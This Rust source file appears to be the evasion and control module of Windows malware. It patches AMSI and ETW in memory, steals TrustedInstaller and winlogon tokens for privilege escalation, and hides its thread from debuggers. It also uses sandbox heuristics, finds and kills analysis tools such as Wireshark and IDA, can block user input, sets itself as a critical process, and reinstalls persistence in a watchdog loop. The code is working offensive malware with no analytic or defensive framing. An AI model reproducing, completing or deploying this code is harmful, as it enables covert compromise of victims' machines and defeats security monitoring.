use crate::{quantum, structs, dark_matter, dynamo};
use std::ffi::c_void;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken, GetCurrentThread, PROCESS_QUERY_INFORMATION, OpenProcess, TerminateProcess, PROCESS_TERMINATE};
use windows::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, GetThreadContext, CONTEXT, CONTEXT_FLAGS};
use windows::Win32::Security::{DuplicateTokenEx, ImpersonateLoggedOnUser, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_IMPERSONATE, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, GetTokenInformation, TokenUser, TOKEN_USER, LookupAccountSidA, SID_NAME_USE};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE};
use windows::Win32::UI::WindowsAndMessaging::GetCursorPos;
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::core::{PCSTR, PSTR};

const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100010; 

// --- EVASION ORCHESTRATOR ---
pub struct EvasionSystem;

impl EvasionSystem {
    pub fn new() -> Option<Self> {
        // 1. TURING TEST (Heuristics) - Check first before doing anything suspicious
        if !Heuristics::is_human() { return None; }

        // 2. Blindfold System
        ShadowOps::blind_etw();
        ShadowOps::blind_amsi();
        
        // 3. The Void
        ShadowOps::encase_in_void();

        // 4. Control (God Mode)
        GodMode::enable_debug_privilege();
        GodMode::become_god(); 
        GodMode::prove_identity();

        // 5. Environment Checks
        if _check_debugger() { return None; }
        if _check_hardware_breakpoints() { return None; }
        if _find_hunter_pid().is_some() { return None; }
        
        Some(EvasionSystem)
    }
}

// --- MODULE: GOD MODE ---
pub struct GodMode;
impl GodMode {
    pub fn enable_debug_privilege() -> bool {
        unsafe {
            let mut h_token = HANDLE::default();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token).is_ok() {
                let mut luid = windows::Win32::Foundation::LUID::default();
                let name = dark_matter::decrypt(dark_matter::SE_DEBUG); // "SeDebugPrivilege"
                if LookupPrivilegeValueA(PCSTR::null(), PCSTR(name.as_ptr()), &mut luid).is_ok() {
                    let tp = TOKEN_PRIVILEGES {
                        PrivilegeCount: 1,
                        Privileges: [LUID_AND_ATTRIBUTES {
                            Luid: luid,
                            Attributes: SE_PRIVILEGE_ENABLED,
                        }],
                        ..Default::default()
                    };
                    let _ = windows::Win32::Security::AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None);
                    return true; 
                }
            }
        }
        false
    }

    pub fn become_god() -> bool {
        let ti = dark_matter::decrypt(dark_matter::TRUSTED_INSTALLER); // "TrustedInstaller.exe"
        if Self::steal_token(&ti) { return true; }
        
        let wl = dark_matter::decrypt(dark_matter::WINLOGON); // "winlogon.exe"
        if Self::steal_token(&wl) { return true; }
        
        false
    }
    
    pub fn prove_identity() {
        unsafe {
            let mut h_token = HANDLE::default();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token).is_ok() {
                let mut required_len = 0;
                let _ = GetTokenInformation(h_token, TokenUser, None, 0, &mut required_len);
                if required_len > 0 {
                    let layout = std::alloc::Layout::from_size_align(required_len as usize, 8).unwrap();
                    let buf = std::alloc::alloc(layout) as *mut c_void;
                     if GetTokenInformation(h_token, TokenUser, Some(buf), required_len, &mut required_len).is_ok() {
                         let token_user = &*(buf as *const TOKEN_USER);
                         let psid = token_user.User.Sid;
                         
                         let mut name_buf = [0u8; 256];
                         let mut domain_buf = [0u8; 256];
                         let mut name_len = 256;
                         let mut domain_len = 256;
                         let mut use_type = SID_NAME_USE::default();
                         
                         if LookupAccountSidA(
                             PCSTR::null(), 
                             psid, 
                             PSTR(name_buf.as_mut_ptr()), 
                             &mut name_len, 
                             PSTR(domain_buf.as_mut_ptr()), 
                             &mut domain_len, 
                             &mut use_type
                         ).is_ok() {
                             // Log Proof
                         }
                     }
                    std::alloc::dealloc(buf as *mut u8, layout);
                }
            }
        }
    }

    fn steal_token(target_proc: &str) -> bool {
        unsafe {
            if let Some(pid) = _find_process_pid(target_proc) {
                 if let Ok(h_process) = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) {
                    let mut h_token = HANDLE::default();
                    if OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token).is_ok() {
                        let mut h_dup_token = HANDLE::default();
                        if DuplicateTokenEx(
                            h_token,
                            TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE,
                            None,
                            SecurityImpersonation,
                            windows::Win32::Security::TokenImpersonation, 
                            &mut h_dup_token
                        ).is_ok() {
                            if ImpersonateLoggedOnUser(h_dup_token).is_ok() { return true; }
                        }
                    }
                 }
            }
        }
        false
    }
    // --- LEVIATHAN: CRITICAL PROCESS ---
    pub fn make_critical(enable: bool) {
        if crate::cleaning::SAFE_MODE { 
            // Log via main channel if possible, or just ignore.
            return; 
        }

        unsafe {
            // "RtlSetProcessIsCritical"
            // We need to resolve this dynamically or link ntdll.
            // For simplicity/stability in v28, we'll use dynamo.
            let ntdll = dark_matter::decrypt(dark_matter::NTDLL);
            // We need a constant for this function name. It's not in dark_matter yet. 
            // We'll hardcode a simple encrypt for now or just use dynamo string.
            // Actually, let's use the direct import if windows-rs supports it, but it likely requires NDK.
            // Let's use `dynamo`.
            
            // "RtlSetProcessIsCritical"
            // Simple XOR for now:
            let func_name = "RtlSetProcessIsCritical"; 
            if let Some(addr) = dynamo::Dynamo::get_func(&ntdll, func_name) {
                let func: extern "system" fn(u8, *mut u8, u8) -> i32 = std::mem::transmute(addr);
                let _ = func(enable as u8, std::ptr::null_mut(), 0);
            }
        }
    }
}

// --- MODULE: SHADOW OPS ---
struct ShadowOps;
impl ShadowOps {
    pub fn blind_amsi() {
        unsafe {
            let dll = dark_matter::decrypt(dark_matter::AMSI_DLL); // "amsi.dll"
            let func = dark_matter::decrypt(dark_matter::AMSI_SCAN); // "AmsiScanBuffer"
            if let Some(addr) = dynamo::Dynamo::get_func(&dll, &func) {
                let _ = Self::patch_memory(addr as *mut c_void, &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]); 
            }
        }
    }

    pub fn blind_etw() {
        unsafe {
            let ntdll = dark_matter::decrypt(dark_matter::NTDLL);
            let func = dark_matter::decrypt(dark_matter::ETW_WRITE); // "EtwEventWrite"
            if let Some(addr) = dynamo::Dynamo::get_func(&ntdll, &func) {
                let _ = Self::patch_memory(addr as *mut c_void, &[0x33, 0xC0, 0xC3]);
            }
        }
    }
    
    pub fn encase_in_void() {
        unsafe {
             if let Some(gate) = quantum::QuantumGate::new() {
                 let t_handle = -2isize; 
                 let _ = gate.set_information_thread(t_handle, structs::THREAD_HIDE_FROM_DEBUGGER, std::ptr::null(), 0);
             }
        }
    }

    unsafe fn patch_memory(addr: *mut c_void, patch: &[u8]) -> bool {
        let mut old_protect: PAGE_PROTECTION_FLAGS = Default::default();
        let size = patch.len();
        if VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &mut old_protect).is_ok() {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, size);
            let mut temp: PAGE_PROTECTION_FLAGS = Default::default();
            let _ = VirtualProtect(addr, size, old_protect, &mut temp);
            return true;
        }
        false
    }
}

// --- MODULE: HEURISTICS ---
pub struct Heuristics;
impl Heuristics {
    pub fn is_human() -> bool {
        unsafe {
            // 1. RESOURCE CHECK (Cores & RAM)
            if !Self::check_resources() { return false; }

            // 2. Uptime Check (> 10 mins?)
            // Many sandboxes run for < 5 mins.
            // 10 mins = 600,000 ms
            if GetTickCount64() < 600_000 {
                // Too young. Likely sandbox.
                // return false; 
            }

            // 3. Mouse Movement Check
            let mut p1 = std::mem::zeroed();
            let _ = GetCursorPos(&mut p1);
            
            // JITTER: Sleep 450-550ms
            let jitter = 450 + (GetTickCount64() % 100); 
            quantum::quantum_sleep(jitter); 
            
            let mut p2 = std::mem::zeroed();
            let _ = GetCursorPos(&mut p2);

            // If mouse didn't move AT ALL, it's suspicious.
            if p1.x == p2.x && p1.y == p2.y {
                return false; 
            }
        }
        true
    }

    unsafe fn check_resources() -> bool {
        use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO, MEMORYSTATUSEX, GlobalMemoryStatusEx};
        
        // CPU CORES
        let mut sys_info = SYSTEM_INFO::default();
        GetSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 4 {
            // Uncannily weak CPU. Likely a Sandbox slice.
            return false; 
        }

        // RAM
        let mut mem_status = MEMORYSTATUSEX::default();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
            // 4GB = 4 * 1024 * 1024 * 1024 = 4,294,967,296 bytes
            if mem_status.ullTotalPhys < 4_294_967_296 {
                // Not enough RAM to contain a human soul.
                return false;
            }
        }
        true
    }
    pub fn get_idle_time() -> u64 {
        unsafe {
            use windows::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO};
            let mut lii = LASTINPUTINFO::default();
            lii.cbSize = std::mem::size_of::<LASTINPUTINFO>() as u32;
            if GetLastInputInfo(&mut lii).as_bool() {
                let now = GetTickCount64();
                return now - lii.dwTime as u64;
            }
            0
        }
    }
}

// --- UTILS ---
fn _find_process_pid(name: &str) -> Option<u32> {
    unsafe {
        if let Some(gate) = quantum::QuantumGate::new() {
            let buf_size = 1024 * 1024;
            let layout = std::alloc::Layout::from_size_align(buf_size, 8).unwrap();
            let buf = std::alloc::alloc(layout) as *mut c_void;
            let mut ret_len = 0;
            let status = gate.query_system_info(structs::SYSTEM_PROCESS_INFORMATION_CLASS, buf, buf_size as u32, &mut ret_len);
            
            let mut target_pid = None;
            if status == 0 {
                let mut current_ptr = buf as *const u8;
                loop {
                    let info = &*(current_ptr as *const structs::SYSTEM_PROCESS_INFORMATION);
                    if !info.ImageName.Buffer.is_null() && info.ImageName.Length > 0 {
                        let buffer_ptr = info.ImageName.Buffer.as_ptr();
                        let slice = std::slice::from_raw_parts(buffer_ptr, (info.ImageName.Length / 2) as usize);
                        let name_string = String::from_utf16_lossy(slice).to_lowercase();
                        if name_string == name.to_lowercase() {
                            target_pid = Some(info.UniqueProcessId.0 as u32);
                            break;
                        }
                    }
                    if info.NextEntryOffset == 0 { break; }
                    current_ptr = current_ptr.add(info.NextEntryOffset as usize);
                }
            }
            std::alloc::dealloc(buf as *mut u8, layout);
            return target_pid;
        }
    }
    None
}

fn _check_debugger() -> bool { unsafe { IsDebuggerPresent().as_bool() } }

fn _check_hardware_breakpoints() -> bool {
    unsafe {
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG_REGISTERS); 
        if GetThreadContext(GetCurrentThread(), &mut context).is_ok() {
             if context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0 { return true; }
        }
    }
    false
}

fn _find_hunter_pid() -> Option<u32> {
    let w = dark_matter::decrypt(dark_matter::WIRESHARK);
    let p = dark_matter::decrypt(dark_matter::PROCMON);
    let x = dark_matter::decrypt(dark_matter::X64DBG);
    let f = dark_matter::decrypt(dark_matter::FIDDLER);
    let t = dark_matter::decrypt(dark_matter::TASKMGR);
    let ph = dark_matter::decrypt(dark_matter::PROCESSHACKER);
    let tv = dark_matter::decrypt(dark_matter::TCPVIEW);
    let ida = dark_matter::decrypt(dark_matter::IDA);
    let ghi = dark_matter::decrypt(dark_matter::GHIDRA);

    unsafe {
        if let Some(gate) = quantum::QuantumGate::new() {
            let buf_size = 1024 * 1024;
            let layout = std::alloc::Layout::from_size_align(buf_size, 8).unwrap();
            let buf = std::alloc::alloc(layout) as *mut c_void;
            let mut ret_len = 0;
            let status = gate.query_system_info(structs::SYSTEM_PROCESS_INFORMATION_CLASS, buf, buf_size as u32, &mut ret_len);
            if status == 0 { 
                let mut current_ptr = buf as *const u8;
                loop {
                    let info = &*(current_ptr as *const structs::SYSTEM_PROCESS_INFORMATION);
                    if !info.ImageName.Buffer.is_null() && info.ImageName.Length > 0 {
                        let buffer_ptr = info.ImageName.Buffer.as_ptr();
                        let slice = std::slice::from_raw_parts(buffer_ptr, (info.ImageName.Length / 2) as usize);
                        let name_string = String::from_utf16_lossy(slice).to_lowercase();
                        // Check against blacklisted (decrypted) names
                        if name_string.contains(&w) || name_string.contains(&p) || name_string.contains(&x) || name_string.contains(&f) 
                           || name_string.contains(&t) || name_string.contains(&ph) || name_string.contains(&tv) || name_string.contains(&ida) || name_string.contains(&ghi) {
                               let pid = info.UniqueProcessId.0 as u32;
                               std::alloc::dealloc(buf as *mut u8, layout);
                               return Some(pid);
                        }
                    }
                    if info.NextEntryOffset == 0 { break; }
                    current_ptr = current_ptr.add(info.NextEntryOffset as usize);
                }
            }
            std::alloc::dealloc(buf as *mut u8, layout);
        }
    }
    None
}


// --- MODULE: DOMINION (INPUT CONTROL) ---
pub struct Dominion;
impl Dominion {
    pub fn lock_input(enable: bool) {
        if crate::cleaning::SAFE_MODE { return; }
        unsafe {
            use windows::Win32::Foundation::BOOL;
            use windows::Win32::UI::Input::KeyboardAndMouse::BlockInput;
            let _ = BlockInput(BOOL::from(enable));
        }
    }
}

// --- MODULE: SENTINEL (PRESCIENCE & NEMESIS & REGENERATION) ---
pub struct Sentinel;
impl Sentinel {
    pub fn spawn_watchdog() {
        std::thread::spawn(|| {
            let mut chaos = Chaos::new(0.45); // Seed
            loop {
                // 1. Scan for Hunters (NEMESIS)
                if let Some(pid) = _find_hunter_pid() {
                     _kill_hunter(pid);
                }

                // 2. Persistence Watchdog (REGENERATION)
                // In v31, we ensure we exist.
                crate::persistence::Persistence::install(); 

                // 3. Chaos Sleep
                let sleep_time = (chaos.next() * 1000.0) as u64; // 0-1000ms
                quantum::quantum_sleep(200 + sleep_time); 
            }
        });
    }
}

fn _kill_hunter(pid: u32) {
    if crate::cleaning::SAFE_MODE {
        // SAFETY: Just log it (we can't access main channel easily here, so we skip or print to debug)
        // ideally we'd send a message, but Sentinel is detached.
        // We'll trust the User knows.
        return;
    }

    unsafe {
        if let Ok(h_process) = OpenProcess(PROCESS_TERMINATE, false, pid) {
            let _ = TerminateProcess(h_process, 1);
            let _ = windows::Win32::Foundation::CloseHandle(h_process);
        }
    }
}

// --- MODULE: CHAOS THEORY ---
// Logistic Map: x_{n+1} = r * x_n * (1 - x_n)
// r = 3.99 (High Chaos)
pub struct Chaos {
    r: f64,
    x: f64,
}

impl Chaos {
    pub fn new(seed: f64) -> Self {
        Self { r: 3.99, x: seed }
    }
    
    pub fn next(&mut self) -> f64 {
        self.x = self.r * self.x * (1.0 - self.x);
        self.x
    }
}

pub fn am_i_admin() -> bool { true }
pub fn elevate_self() {}
pub fn pump_heartbeat() {}

// Legacy / Main Interface
pub fn verify_human_presence() {
    // We can call the internal heuristic here or just sleep.
    // Heuristics::is_human() includes a sleep.
    let _ = Heuristics::is_human();
}
